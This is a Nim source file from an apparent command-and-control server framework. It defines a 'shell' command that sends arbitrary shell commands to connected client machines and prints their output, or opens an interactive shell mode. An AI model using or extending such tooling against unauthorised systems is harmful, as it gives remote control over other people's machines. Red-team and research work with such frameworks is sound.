import ../prelude

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  if len(args) < 1:
    infoLog "entering shell mode, use 'back' to exit"
    server.cli.mode = ShellMode
    return
  
  for client in server.cli.handlingClient:
    let task = await client.sendClientTask("shell", @[ args[0] ])
    if not task.isNil(): 
      await task.awaitResponse()
      infoLog task.output.data, false

let cmd*: Command = Command(
  execProc: execProc,
  name: "shell",
  argsLength: 0,
  usage: @["shell", "shell \"[command]\""],
  cliMode: @[ClientInteractMode],
  description: "Send a shell command or enter shell mode when no command is passed",
  category: CCClientInteraction,
  requiresConnectedClient: true
)